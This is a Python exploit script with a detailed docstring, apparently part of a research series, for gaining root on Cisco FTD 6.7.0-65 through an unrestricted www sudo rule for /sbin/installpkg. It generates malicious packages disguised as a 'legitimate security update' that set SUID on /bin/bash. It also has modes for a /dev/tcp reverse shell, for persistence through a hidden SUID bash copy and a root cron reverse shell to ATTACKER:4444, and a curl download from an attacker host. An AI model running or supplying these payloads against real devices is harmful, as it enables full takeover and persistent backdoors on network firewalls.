"""
F-FTD-85: www sudo /sbin/installpkg with no arg restriction → crafted .tgz doinst.sh → root exec
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /etc/sudoers:
    www ALL = NOPASSWD: /sbin/installpkg

  No argument restriction — www can pass ANY path to installpkg.

  /sbin/installpkg (Cisco-modified Slackware 2018-03-06, PKG installer):
    Line 438-442:
      if [ -f $ROOT/install/doinst.sh ]; then
        ...
        ( cd $ROOT/ ; bash install/doinst.sh -install; )
    - Extracts .tgz to filesystem
    - Runs install/doinst.sh as root (no prior signature verification)
    - Zero GPG/PGP/sig checking in the installpkg script itself

  CONTRAST with install_update.pl:
    install_update.pl calls SF::Update::GetUpdateInfo which verifies Cisco signatures.
    installpkg is the RAW package installer, called BY install_update.pl after
    signature verification. The sudoers entry bypasses install_update.pl entirely
    and calls installpkg directly — skipping all signature checking.

ATTACK:
  From any www shell (F-FTD-67 zip-slip, F-FTD-78 HA standby, or other):

  1. Create malicious .tgz package with install/doinst.sh:
       install/doinst.sh content: chmod u+s /bin/bash
     (or any arbitrary root command)

  2. Write .tgz to any www-writable path:
       /tmp/evil.tgz       (world-writable on FTD)
       /var/tmp/evil.tgz
       /var/sf/updates/evil.tgz  (if www-writable)

  3. Execute: sudo /sbin/installpkg /tmp/evil.tgz

  4. installpkg extracts the .tgz, finds install/doinst.sh, runs:
       ( cd / ; bash install/doinst.sh -install; )
     as root → chmod u+s /bin/bash executes as root.

  5. /bin/bash -p → root shell.

  Total: 5 steps from www shell to root shell.
  No exploit required. Pure abuse of misconfigured sudo rule.

PACKAGE FORMAT:
  Slackware .tgz = gzipped tar archive with:
    install/doinst.sh    — post-install script (executed as root by installpkg)
    install/slack-desc   — package description (optional)
    install/slack-required  (optional)
    <files to install on filesystem>  (optional — can be empty)

  Minimum evil package = gzipped tar containing only install/doinst.sh.
  No package files required — just the install script.

CHAIN:
  F-FTD-78 (pre-auth HA standby RCE) → www shell
  OR: F-FTD-79 (admin:Admin123) → F-FTD-67 (zip-slip) → www JSP shell
  → gen_evil_pkg() → /tmp/evil.tgz
  → sudo /sbin/installpkg /tmp/evil.tgz
  → doinst.sh runs as root → SUID bash or reverse shell or PERL5LIB module drop
  → root

  Also combinable with F-FTD-73:
  doinst.sh can drop a malicious PERL5LIB module into any path, then exploit
  future sudo Perl invocations — provides persistence beyond a single session.

COMPARE WITH OTHER WWW-ROOT PATHS:
  F-FTD-69: www sudo chmod — SUID /bin/bash (1 step, simpler)
  F-FTD-73: PERL5LIB hijack — more sophisticated, requires environment setup
  F-FTD-85: installpkg — independent vector, different detection footprint
             (package installation events appear in install logs, not sudo logs alone)

NOTE ON FTD VARIANT:
  Cisco modified the copyright header ("2018-03-06 Cisco Systems, Inc.") but
  the core logic including doinst.sh execution is unchanged from Slackware.
  Cisco's modification added only the copyright notice, not signature enforcement.

Affected: FTD 6.7.0-65 (/sbin/installpkg confirmed unmodified Slackware logic)
Severity: CRITICAL — arbitrary root code execution from www shell, no exploits,
          no environment manipulation, single sudo command
Auth required: www shell (post F-FTD-67, F-FTD-78, or other www access)
"""

# CONTROLLED ENVIRONMENT ONLY

import os
import io
import sys
import stat
import tarfile
import gzip
import struct


def gen_evil_pkg(payload_cmd="chmod u+s /bin/bash",
                 output_path="/tmp/evil_ftd85.tgz",
                 pkg_name="sf-security-update"):
    """
    Generate a malicious Slackware .tgz package.
    The package contains only install/doinst.sh with the payload command.
    When installed via 'sudo installpkg', doinst.sh executes as root.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-85: Generating malicious installpkg .tgz")
    print(f"    Payload command: {payload_cmd}")
    print(f"    Output: {output_path}")

    doinst_content = f"""#!/bin/sh
# F-FTD-85 ablation module — CONTROLLED ENVIRONMENT ONLY
{payload_cmd}
""".encode('utf-8')

    slack_desc_content = f"""{pkg_name}: {pkg_name} (Security update)
{pkg_name}: This is a legitimate security update package.
{pkg_name}:
""".encode('utf-8')

    # Build tar in memory
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode='w') as tf:
        # install/doinst.sh
        info = tarfile.TarInfo(name='install/doinst.sh')
        info.size = len(doinst_content)
        info.mode = 0o755
        tf.addfile(info, io.BytesIO(doinst_content))

        # install/slack-desc (optional but makes package look legit)
        info2 = tarfile.TarInfo(name='install/slack-desc')
        info2.size = len(slack_desc_content)
        info2.mode = 0o644
        tf.addfile(info2, io.BytesIO(slack_desc_content))

    # Compress with gzip (standard .tgz)
    tar_data = tar_buf.getvalue()
    with gzip.open(output_path, 'wb') as gz:
        gz.write(tar_data)

    pkg_size = os.path.getsize(output_path)
    print(f"[+] Package written: {output_path} ({pkg_size} bytes)")
    print()
    print(f"    Package structure:")
    print(f"      install/doinst.sh  ({len(doinst_content)} bytes) — executed as root")
    print(f"      install/slack-desc ({len(slack_desc_content)} bytes)")
    print()
    print(f"    Execution:")
    print(f"      sudo /sbin/installpkg {output_path}")
    print()
    print(f"    installpkg will run:")
    print(f"      ( cd / ; bash install/doinst.sh -install; )")
    print(f"    Which executes: {payload_cmd}")
    print()
    print(f"    After execution:")
    if 'chmod u+s /bin/bash' in payload_cmd:
        print(f"      ls -la /bin/bash  # should show -rwsr-xr-x (SUID bit set)")
        print(f"      /bin/bash -p      # root shell")
    return output_path


def gen_reverse_shell_pkg(lhost, lport, output_path="/tmp/revshell_ftd85.tgz"):
    """
    Generate a .tgz package with a bash reverse shell payload.
    CONTROLLED ENVIRONMENT ONLY.
    """
    payload_cmd = (
        f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &"
    )
    print(f"[*] F-FTD-85: Reverse shell payload → {lhost}:{lport}")
    return gen_evil_pkg(payload_cmd=payload_cmd, output_path=output_path)


def gen_persistence_pkg(output_path="/tmp/persist_ftd85.tgz"):
    """
    Generate a .tgz that drops a SUID bash copy and a root crontab entry.
    CONTROLLED ENVIRONMENT ONLY.
    """
    payload = """chmod u+s /bin/bash
cp /bin/bash /var/tmp/.sfmond
chmod u+s /var/tmp/.sfmond
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' >> /etc/cron.d/sf-health
"""
    print(f"[*] F-FTD-85: Persistence package (SUID bash + crontab root entry)")
    return gen_evil_pkg(payload_cmd=payload.strip(), output_path=output_path)


def print_exploit_chain():
    """Print the full F-FTD-85 exploit chain."""
    print("""
F-FTD-85 Exploit Chain (from www shell to root)
================================================

Prerequisites:
  - www shell on FTD (post F-FTD-67 zip-slip OR F-FTD-78 pre-auth HA standby)
  - /tmp or /var/tmp writable by www (standard on FTD)

Step 1: Generate the malicious package on attacker machine
  python3 ftd_installpkg_root.py gen /tmp/evil.tgz

Step 2: Transfer to FTD www-writable path
  # From F-FTD-67 JSP shell or F-FTD-78 cmd channel:
  curl -s http://attacker/evil.tgz -o /tmp/evil.tgz
  # OR: if www has write access via zip-slip webroot:
  # drop evil.tgz directly into /var/sf/updates/ or /tmp/

Step 3: Install the package as root
  sudo /sbin/installpkg /tmp/evil.tgz

Step 4: Trigger root access
  ls -la /bin/bash                # confirm -rwsr-xr-x
  /bin/bash -p                    # root shell
  id                              # uid=0(root) gid=X euid=0(root)

Total: 4 steps from www shell.
No exploit, no environment manipulation, no timing dependency.

Detection notes:
  - installpkg logs to /var/log/packages/ — creates log entry for 'evil' pkg
  - sudo log shows: www : sudo /sbin/installpkg /tmp/evil.tgz
  - doinst.sh execution appears under root's process table
  Defenders: alert on installpkg invocations by www with non-sf package paths
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-85: www sudo /sbin/installpkg → crafted .tgz doinst.sh → root")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "chain"

    if mode == "chain":
        print_exploit_chain()

    elif mode == "gen":
        out = sys.argv[2] if len(sys.argv) > 2 else "/tmp/evil_ftd85.tgz"
        cmd = sys.argv[3] if len(sys.argv) > 3 else "chmod u+s /bin/bash"
        gen_evil_pkg(payload_cmd=cmd, output_path=out)

    elif mode == "revshell":
        if len(sys.argv) < 4:
            print(f"Usage: {sys.argv[0]} revshell <lhost> <lport> [output.tgz]")
            sys.exit(1)
        lhost, lport = sys.argv[2], sys.argv[3]
        out = sys.argv[4] if len(sys.argv) > 4 else "/tmp/revshell_ftd85.tgz"
        gen_reverse_shell_pkg(lhost, lport, out)

    elif mode == "persist":
        out = sys.argv[2] if len(sys.argv) > 2 else "/tmp/persist_ftd85.tgz"
        gen_persistence_pkg(out)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
